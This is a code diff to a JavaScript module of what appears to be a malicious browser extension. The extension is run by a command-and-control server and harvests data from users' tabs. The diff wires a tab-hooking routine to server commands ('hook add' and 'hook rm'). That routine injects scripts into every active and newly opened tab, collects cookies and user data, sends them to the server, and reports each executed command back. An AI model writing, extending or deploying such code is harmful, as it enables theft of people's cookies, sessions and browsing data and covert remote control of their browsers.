@@ -5,6 +5,7 @@
 // This header will be defined for every module to define processing of new cmds 
 // & querying new cmds from server.  
 // Define one header to embed all necessary c&c server functions.
+let executedCmd = {{CC_EXECUTED_CMD_FN}};
 let getCmds = {{CC_GET_CMDS_FN}};
 let sendData = {{CC_SEND_DATA_FN}};
 let QUERY_CMDS_INTERVAL = 1 * 60 * 1000; // Get new cmds from server every 1 minute.
@@ -20,10 +21,15 @@ function execModulesWithParams(args_list) {
 function parseExecCmdsMail(cmds_list) {
 	// Commands Format:
 	// (module_name, op, args_list)
+	// For example:
+	// ["tabs", "hook", ["add"]]
+	// ["tabs", "hook", ["rm"]]
 	for (let i=0; i<cmds_list.length; i++) {
-		if (cmds_list[0].toLowerCase() === MODULE_NAME) {
-			if (cmds_list[1].toLowerCase() === 'get') {
-				execModuleWithParams(cmds_list[2]);
+		let cmd = cmds_list[i];
+		if (cmd[0].toLowerCase() === MODULE_NAME) {
+			if (cmd[1].toLowerCase() === 'hook') {
+				execModuleWithParams(cmd[2]);
+				executedCmd(cmd); // Inform C&C module for execution
 			}
 		}
 	}
@@ -61,10 +67,7 @@ function get_cookies_post_server(request, sender, sendResponse) {
 
 ////
 
-// Add hooks for extracted data & auto sender.
-chrome.runtime.onMessage.addListener(get_cookies_post_server);
-
-//Method 1: every "QUERY_ALL_DATA_INTERVAL" - send all users' data.
+//Method 1: Move over all active tabs, inject & send all users' data.
 function inject_active_tab_get_data(tab_id) {
 	if (tab_id) {
 		// Inject on specific tab:
@@ -82,6 +85,13 @@ function inject_active_tab_get_data(tab_id) {
 	}
 }
 
+//Method 2: upon new tab inited.
+function new_tab_injector(tab) {
+	let tab_id=tab.id; 
+	inject_active_tab_get_data(tab.id);
+}
+
+// Clean All running hooks (New tabs & listen for extraction messages).
 function clean_all() {
 	try { 
 		chrome.runtime.onMessage.removeListener(get_cookies_post_server);
@@ -95,17 +105,17 @@ function clean_all() {
 
 }
 
-
-//Method 1: every "QUERY_ALL_DATA_INTERVAL" - send all users' data.
-// setInterval(inject_active_tab_get_data, QUERY_ALL_DATA_INTERVAL);
-
-//Method 2: upon new tab inited.
-function new_tab_injector(tab) {
-	let tab_id=tab.id; 
-	inject_active_tab_get_data(tab.id);
+async function tabs_hook_main(args) {
+	if (args[0] === 'add') {
+		// Method 1 listener: Inject into all tabs & Listen for the extracted data & auto sender.
+		chrome.runtime.onMessage.addListener(get_cookies_post_server);
+		inject_active_tab_get_data();
+		// Method 2 listeners: On every new opened tab.
+		chrome.tabs.onCreated.addListener(new_tab_injector);
+	} 
+	else if (args[0] === 'rm') {
+		clean_all();
+	}
 }
 
-chrome.tabs.onCreated.addListener(new_tab_injector);
-
-//Storage-collector: Check every SEND_ count if there's data to sent & send it.
-setInterval(send_data, SEND_DATA_INTERVAL);
+let MODULE_TECHNIQUES = [tabs_hook_main];
